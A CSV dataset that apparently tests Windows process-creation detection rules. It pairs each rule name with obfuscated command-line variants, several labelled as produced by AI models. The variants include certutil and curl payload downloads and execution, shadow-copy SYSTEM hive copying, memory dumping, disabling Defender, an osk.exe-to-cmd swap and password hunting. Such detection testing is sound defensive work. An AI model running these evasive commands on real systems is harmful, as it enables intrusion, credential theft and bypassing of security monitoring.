rule_name,commandline_evasion,row_count,sources
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-urlcache"""" /""split"" -f https://pastebin.com/raw/example123 C:\ emp\payload.exe",2,gemini; qwen32b
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe -""urlcache"" -sPlIt -F https://rentry.co/example123/raw C:\ emp\payload.exe",1,gemini
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe -""urlcache"" -split -f https://rentry.co/example123/raw C:\ emp\payload.exe",2,gemini; qwen32b
proc_creation_win_certutil_encode,"certutil.exe -""e^ncode"" input.txt output.txt",2,gemini; qwen32b
proc_creation_win_certutil_encode,"certutil.exe -""encodehex"" input.txt output.txt 1",1,gemini
proc_creation_win_certutil_encode,"certutil.exe /""e^ncode"" input.txt output.txt",1,gemini
proc_creation_win_certutil_encode_susp_extensions,"certutil.exe -""encode"" payload.bin encoded_payload.txt",1,gemini
proc_creation_win_certutil_encode_susp_extensions,"certutil.exe /""encode"" payload.bin encoded_payload.txt",1,gemini
proc_creation_win_certutil_export_pfx,"certutil.exe ""-exportPFX"" LocalMachine C:\temp\cert.pfx",1,gemini
proc_creation_win_certutil_export_pfx,certutil.exe -exportPFX        CurrentUser        C:\temp\cert.pfx,1,gemini
proc_creation_win_certutil_ntlm_coercion,"certutil.exe -syncwithWU""\\10.10.10.10\share""",2,gemini; qwen32b
proc_creation_win_certutil_ntlm_coercion,certutil.exe /syncwithWU \\192.168.1.100\share,2,gemini; qwen32b
proc_creation_win_chcp_codepage_lookup,chcp,1,gemini
proc_creation_win_chcp_codepage_lookup,chcp.com,3,gemini; qwen32b:2
proc_creation_win_chcp_codepage_lookup,"cmd.exe /c ""C:\Windows\System32\chcp.com """,1,gemini
proc_creation_win_chcp_codepage_lookup,"cmd.exe /c ""chcp""",2,gemini; qwen32b
proc_creation_win_chcp_codepage_lookup,cmd.exe /c chcp .,1,gemini
proc_creation_win_chcp_codepage_lookup,"powershell.exe -Command ""[Console]::OutputEncoding""",1,gemini
proc_creation_win_chcp_codepage_switch,"chcp ""936""",1,gemini
proc_creation_win_chcp_codepage_switch,"chcp.com ""936""",1,gemini
proc_creation_win_chcp_codepage_switch,chcp.com 00936,1,gemini
proc_creation_win_chcp_codepage_switch,chcp.com 936,1,gemini
proc_creation_win_chcp_codepage_switch,cmd.exe /c chcp 0936,1,gemini
proc_creation_win_citrix_trolleyexpress_procdump,TrolleyExpress.exe 999,2,gemini:2
proc_creation_win_citrix_trolleyexpress_procdump,TrolleyExpress.exe `755`,2,gemini:2
proc_creation_win_cloudflared_tunnel_cleanup,"cloudflared tunnel cleanup --config=""C:\temp\config.yml""",1,gemini
proc_creation_win_cloudflared_tunnel_cleanup,cloudflared.exe tunnel cleanup -config=C:\temp\config.yml,2,gemini; qwen32b
proc_creation_win_cmd_curl_download_exec_combo,cmd.exe /c curl.exe http://example.com/payload.exe -o payload.exe & payload.exe,4,gemini:4
proc_creation_win_cmd_del_execution,C:\Windows\System32\cmd.exe /c del %TEMP%\*.tmp,1,gemini
proc_creation_win_cmd_del_greedy_deletion,"cmd.exe -""c"" ""d^e^l C:\ProgramData\*.dll""",1,gemini
proc_creation_win_cmd_del_greedy_deletion,"cmd.exe /""c"" ""d^e^l C:\ProgramData\*.dll""",2,gemini; qwen32b
proc_creation_win_cmd_del_greedy_deletion,"cmd.exe /C ""d^e^l C:\ProgramData\*.dll""",2,gemini; qwen32b
proc_creation_win_cmd_del_greedy_deletion,"cmd.exe /c ""cd C:\ProgramData && del *.dll""",1,gemini
proc_creation_win_cmd_del_greedy_deletion,"cmd.exe /c ""d^e^l C:\ProgramData\*.dll""",1,gemini
proc_creation_win_cmd_dir_execution,"cmd.exe /c ""tree C:\ /F""",1,gemini
proc_creation_win_cmd_dosfuscation,"cmd.exe /c ""FOR /F ""tokens=1"" %A IN ('echo set') DO %A MYVAR=value""",1,gemini
proc_creation_win_cmd_dosfuscation,"cmd.exe /c ""s""e""t OBJ=calc.exe && %O%B%J%""",2,gemini; qwen32b
proc_creation_win_cmd_dosfuscation,cmd.exe /c echo ^,2,qwen14b; qwen32b
proc_creation_win_cmd_dosfuscation,cmd.exe /c echo ^ ^,2,qwen14b; qwen32b
proc_creation_win_cmd_dosfuscation,cmd.exe /c echo ^caret^,1,qwen14b
proc_creation_win_cmd_dosfuscation,cmd.exe /c echo ^s^e^t,1,qwen32b
proc_creation_win_cmd_mklink_osk_cmd,cmd /c mklink C:\Windows\System32\osk.exe C:\Windows\System32\cmd,2,gemini:2
proc_creation_win_cmd_mklink_shadow_copies_access_symlink,"cmd.exe /c ""m^kli^n^k /D C:\temp\vss \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1""",1,gemini
proc_creation_win_cmd_mklink_shadow_copies_access_symlink,"powershell.exe -""Command"" ""New-Item -ItemType SymbolicLink -Path C:\temp\vss_link -Target \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1""",1,gemini
proc_creation_win_cmd_mklink_shadow_copies_access_symlink,"powershell.exe -COMMaNd ""New-Item -ItemType SymbolicLink -Path C:\temp\vss_link -Target \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1""",2,gemini:2
proc_creation_win_cmd_mklink_shadow_copies_access_symlink,"powershell.exe -Command ""New-Item -ItemType SymbolicLink -Path C:\temp\vss_link -Target \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1""",2,gemini:2
proc_creation_win_cmd_mklink_shadow_copies_access_symlink,"powershell.exe -c ""New-Item -ItemType SymbolicLink -Path C:\temp\vss_link -Target \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1""",2,gemini:2
proc_creation_win_cmd_mklink_shadow_copies_access_symlink,"powershell.exe /""Command"" ""New-Item -ItemType SymbolicLink -Path C:\temp\vss_link -Target \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1""",1,gemini
proc_creation_win_cmd_no_space_execution,"cmd.exe /""c^"" whoami",1,gemini
proc_creation_win_cmd_ping_del_combined_execution,ping 127.0.0.1 -n 5 > NUL && del lockbit.exe,1,gemini
proc_creation_win_cmd_redirection_susp_folder,"cmd.exe /c ""cd C:\Windows\Temp && hostname > output.txt""",1,gemini
proc_creation_win_cmd_redirection_susp_folder,"cmd.exe /c ""set p=C:\ProgramData\ && call echo recon_data > %p%out.txt""",1,gemini
proc_creation_win_cmd_redirection_susp_folder,"cmd.exe /c ""systeminfo >  C:\ProgramData\info.txt""",2,gemini; qwen32b
proc_creation_win_cmd_redirection_susp_folder,"cmd.exe /c dir > ""%TEMP%\output.txt""",1,qwen32b
proc_creation_win_cmd_redirection_susp_folder,"cmd.exe /c echo test >> ""C:\Windows\Temp\testfile.txt""",1,qwen32b
proc_creation_win_cmd_redirection_susp_folder,"cmd.exe /c hostname > ""%USERPROFILE%\Documents\hostname_output.txt""",1,qwen32b
proc_creation_win_cmd_rmdir_execution,cmd.exe /c rd /s /q C:\temp\malicious_folder,1,gemini
proc_creation_win_cmd_shadowcopy_access,"""cmd.exe"" /c ""copy ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE",1,gemini
proc_creation_win_cmd_stdin_redirect,"for /f ""tokens=*"" %i in (payload.txt) do cmd.exe /c %i",1,gemini
proc_creation_win_cmd_stdin_redirect,type payload.txt | cmd.exe,1,gemini
proc_creation_win_cmd_type_arbitrary_file_download,cmd.exe /c t^y^p^e C:\temp\data.txt > \\webdav.server.local\share\data.txt,1,gemini
proc_creation_win_cmd_type_arbitrary_file_download,"cmd.exe /c type ""\\malicious.server.com\share\payload.exe"" > C:\payload.exe",1,gemini
proc_creation_win_cmd_type_arbitrary_file_download,cmd.exe /c type \\live.sysinternals.com\tools\Procmon.exe>C:\temp\Procmon.exe,1,gemini
proc_creation_win_cmd_type_arbitrary_file_download,cmd.exe /c type \\malicious.server.com\share\payload.exe>>C:\payload.exe,1,gemini
proc_creation_win_cmdkey_adding_generic_creds,"cmdkey.exe ""/generic:10.10.10.10"" ""/user:Administrator"" ""/pass:P@ssw0rd123!""",1,gemini
proc_creation_win_cmdkey_adding_generic_creds,cmdkey.exe /add:10.10.10.10 /user:Administrator /pass:P@ssw0rd123!,1,gemini
proc_creation_win_cmdkey_recon,"cmdkey.exe ""/list""",1,gemini
proc_creation_win_cmdkey_recon,"cmdkey.exe,/list",1,gemini
proc_creation_win_cmdl32_arbitrary_file_download,cmdl32.exe -vpn -lan C:\path\to\config.txt,4,gemini:4
proc_creation_win_conhost_headless_powershell,"conhost.exe -""-headless"" ""C:\Windows\System32\WindowsPowerShell\v1.0\pwsh.exe -Command Write-Host 'Bypassed'""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe -""-headless"" ""p^o^w^e^r^s^h^e^l^l -ExecutionPolicy Bypass -File C:\script.ps1""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe -""-headless"" pwsh.exe -""Command"" ""Write-Host 'Simulated Bypass'""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe -""-headless"" pwsh.exe -Command ""Write-Host 'Simulated Bypass'""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe --HeAdLEss pwsh.exe -Command ""Write-Host 'Simulated Bypass'""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe --HeAdlESs pwsh.exe -cOmMand ""Write-Host 'Simulated Bypass'""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe --HeAdleSS pwsh.exe -Command ""Write-Host 'Simulated Bypass'""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe --HeAdlesS ""p^o^w^e^r^s^h^e^l^l -ExecutionPolicy Bypass -File C:\script.ps1""",6,gemini:6
proc_creation_win_conhost_headless_powershell,"conhost.exe --hEadLESs ""p^o^w^e^r^s^h^e^l^l -ExecutionPolicy Bypass -File C:\script.ps1""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe --hEadLeSs ""p^o^w^e^r^s^h^e^l^l -ExecutionPolicy Bypass -File C:\script.ps1""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe --heADLEss ""p^o^w^e^r^s^h^e^l^l -ExecutionPolicy Bypass -File C:\script.ps1""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe --headless ""p^o^w^e^r^s^h^e^l^l -ExecutionPolicy Bypass -File C:\script.ps1""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe --headless pwsh.exe -""Command"" ""Write-Host 'Simulated Bypass'""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe --headless pwsh.exe -Command ""Write-Host 'Simulated Bypass'""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe --headless pwsh.exe /""Command"" ""Write-Host 'Simulated Bypass'""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe /""-headless"" pwsh.exe -COmMANd ""Write-Host 'Simulated Bypass'""",7,gemini:6; qwen32b
proc_creation_win_conhost_headless_powershell,"conhost.exe /""-headless"" pwsh.exe -COmmAnd ""Write-Host 'Simulated Bypass'""",7,gemini:6; qwen32b
proc_creation_win_conhost_legacy_option,conhost 0xffffffff -ForceV1,1,gemini
proc_creation_win_conhost_legacy_option,conhost.exe -ForceV1 0x00000000ffffffff,1,qwen14b
proc_creation_win_csc_susp_dynamic_compilation,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Temp\payload.exe C:\Temp\payload.cs,2,gemini; qwen32b
proc_creation_win_csc_susp_dynamic_compilation,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Tasks\update.exe C:\Windows\Tasks\update.cs,2,gemini; qwen32b
proc_creation_win_curl_custom_user_agent,"curl.exe --header ""User-Agent: Mozilla/5.0"" https://example.com",2,qwen14b; qwen32b
proc_creation_win_curl_custom_user_agent,curl.exe --header 'User-Agent: CustomAgent/1.0' https://example.com,1,qwen32b
proc_creation_win_curl_susp_download,curl.exe --create-dirs -o C:\Windows\Tasks\payload.dll http://example.com/payload.dll?download=1,2,gemini; qwen32b
proc_creation_win_defender_remove_context_menu,"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'""",1,gemini
proc_creation_win_defender_remove_context_menu,"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" -NonInteractive",1,gemini
proc_creation_win_defender_remove_context_menu,"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" -WindowStyle Hidden",1,gemini
proc_creation_win_defender_remove_context_menu,"powershell.exe -Command ""rm HKCR:\*\shellex\ContextMenuHandlers\EPP""",1,gemini
proc_creation_win_defender_remove_context_menu,"powershell.exe -c ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'""",1,gemini
proc_creation_win_desktopimgdownldr_susp_execution,"reg.exe delete HKCU\Software\Microsoft\Windows\CurrentVersion\CloudStore\Store\Cache\DefaultAccount\""PersonalizationCSP""",1,gemini
proc_creation_win_deviceenroller_dll_sideloading,C:\Windows\System32\DeviceEnroller.exe -PhoneDeepLink AnyStringDataHere,1,gemini
proc_creation_win_deviceenroller_dll_sideloading,DeviceEnroller.exe --PhoneDeepLink C:\Lab\input\sample.log,1,qwen14b
proc_creation_win_discovery_via_reg_queries,"""powershell.exe"" & {Get-ItemPropertyValue -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell""}",2,gemini; qwen32b
proc_creation_win_discovery_via_reg_queries,"""powershell.exe"" & {Get-ItemPropertyValue -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit""}",2,gemini; qwen32b
proc_creation_win_discovery_via_reg_queries,"powershell.exe -Command ""(Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall').PSObject.Properties | Where-Object { $_.Name -eq 'DisplayName' } | Select-Object -ExpandProperty Value""",1,qwen32b
proc_creation_win_discovery_via_reg_queries,"powershell.exe -Command ""Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion' | Select-Object -ExpandProperty CurrentBuildNumber""",2,gemini:2
proc_creation_win_discovery_via_reg_queries,"powershell.exe -Command ""gp""""v -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion' -Name CurrentBuildNumber""",1,gemini
proc_creation_win_discovery_via_reg_queries,"reg query ""HKLM\SOFTWARE\Microsoft\\Windows NT\\CurrentVersion"" /v CurrentBuildNumber",1,gemini
proc_creation_win_discovery_via_reg_queries,"reg query ""HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"" /v TimeZoneKeyName",2,gemini; qwen32b
proc_creation_win_dism_remove,Dism -Online -Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet,1,gemini
proc_creation_win_dism_remove,dism.exe /Online -Disable-Feature /FeatureName:Windows-Defender /NoRestart /Quiet,1,gemini
proc_creation_win_dism_remove,dism.exe /Online /Disable-Feature /FeatureName:Windows-Defender /Quiet /NoRestart,1,gemini
proc_creation_win_dllhost_no_cli_execution,C:\Windows\System32\dllhost.exe,1,gemini
proc_creation_win_dllhost_no_cli_execution,d l l h o s t . e x e,1,gemini
proc_creation_win_dsacls_password_spray,dsacls.exe /U:admin /P:Password123,1,gemini
proc_creation_win_dumpminitool_execution,"DumpMinitool.exe 712 C:\temp\dump.dmp F""ull",2,gemini:2
proc_creation_win_dumpminitool_execution,DumpMinitool.exe 712 C:\temp\dump.dmp Full,2,gemini:2
proc_creation_win_dumpminitool_susp_execution,mkdir C:\Temp\Extensions\ && copy DumpMinitool.exe C:\Temp\Extensions\DumpMinitool.exe && C:\Temp\Extensions\DumpMinitool.exe --file C:\Temp\memory.dmp --processId 752 --dumpType Full,4,gemini:4
proc_creation_win_expand_cabinet_files,"expand ""C:\Users	haim\AppData\Local\Temp\art-expand-test.cab"" -F ""*"" .",1,gemini
proc_creation_win_expand_cabinet_files,"expand ""C:\\Users\\thaim\\AppData\\Local\\Temp\\art-expand-test.cab"" -F:* .",2,qwen32b:2
proc_creation_win_explorer_break_process_tree,"explorer.exe ""/root,C:\Windows\System32\calc.exe""",2,gemini; qwen32b
proc_creation_win_explorer_break_process_tree,"explorer.exe,/root,C:\Windows\System32\calc.exe",2,gemini; qwen32b
proc_creation_win_explorer_nouaccheck,explorer.exe -NOUACCHECK,3,gemini; qwen14b; qwen32b
proc_creation_win_explorer_nouaccheck,explorer.exe /nouacheck,1,qwen32b
proc_creation_win_explorer_nouaccheck,"schtasks /create /tn ""TestUACBypass"" /tr ""explorer.exe /NOUACCHECK"" /sc once /st 12:00",1,gemini
proc_creation_win_findstr_download,"findstr.exe	/v	/l	""TEST-HOST""	\\example.com\share\test.txt",4,gemini:3; qwen32b
proc_creation_win_findstr_download,"findstr.exe ""-v"" ""-l"" ""TEST-HOST"" \\example.com\share\test.txt",4,gemini:3; qwen32b
proc_creation_win_findstr_download,"findstr.exe /vl ""TEST-HOST"" \\example.com\share\test.txt",4,gemini:3; qwen32b
proc_creation_win_findstr_gpp_passwords,"findstr /S cpa""""ssword \\THAIMX\sysvol\*.xml",1,gemini
proc_creation_win_findstr_gpp_passwords,"findstr /S cpassword \\THAIMX\sysvol\*.xm""""l",1,gemini
proc_creation_win_findstr_lsass,findstr [l][s][a][s][s],1,gemini
proc_creation_win_findstr_lsass,"findstr lsa""""ss",1,gemini
proc_creation_win_findstr_lsass,findstr lsa.s,1,gemini
proc_creation_win_fsutil_drive_enumeration,"fsutil fsinfo dri""""ves",1,gemini
proc_creation_win_fsutil_symlinkevaluation,fsutil behavior	set	SymlinkEvaluation	R2L:1,1,gemini
proc_creation_win_fsutil_symlinkevaluation,"fsutil behavior set ""Symlink""""Evaluation"" R2L:1",1,gemini
proc_creation_win_fsutil_symlinkevaluation,fsutil behavior set SymlinkEvaluation R2L:1,1,gemini
proc_creation_win_fsutil_symlinkevaluation,fsutil behavior set SymlinkEvaluation R2R:1,1,gemini
proc_creation_win_git_susp_clone,git clone https://github.com/user/CVE-2023-4567.git C:/temp/research,1,gemini
proc_creation_win_git_susp_clone,git clone https://github.com/user/CVE-2023-4567.git C:\temp\research\CVE-2023-4567\,1,gemini
proc_creation_win_git_susp_clone,git.exe	clone	https://example.com/repositories/Vulns-Check,1,gemini
proc_creation_win_git_susp_clone,"git.exe ""clone"" https://example.com/repositories/Vulns-Check",1,gemini
proc_creation_win_git_susp_clone,git.exe clone https://example.com/repositories/%56ulns-Check,1,gemini
proc_creation_win_gpresult_execution,gpresult  /z,1,gemini
proc_creation_win_gpresult_execution,gpresult -z,2,gemini; qwen14b
proc_creation_win_gpresult_execution,gpresult /h report.html /f,1,gemini
